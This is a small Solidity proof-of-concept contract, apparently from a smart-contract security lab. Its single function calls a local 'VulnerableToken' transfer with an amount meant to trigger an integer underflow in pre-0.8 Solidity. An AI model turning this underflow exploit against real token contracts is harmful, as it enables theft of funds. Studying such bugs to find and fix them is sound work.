// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract Attack {
    VulnerableToken public vulnerableToken;

    constructor(address _vulnerableTokenAddress) {
        vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
    }

    function exploitUnderflow() public {
        vulnerableToken.transfer(msg.sender, 100); // ⚡ Try sending way more than 2 tokens
    }
}
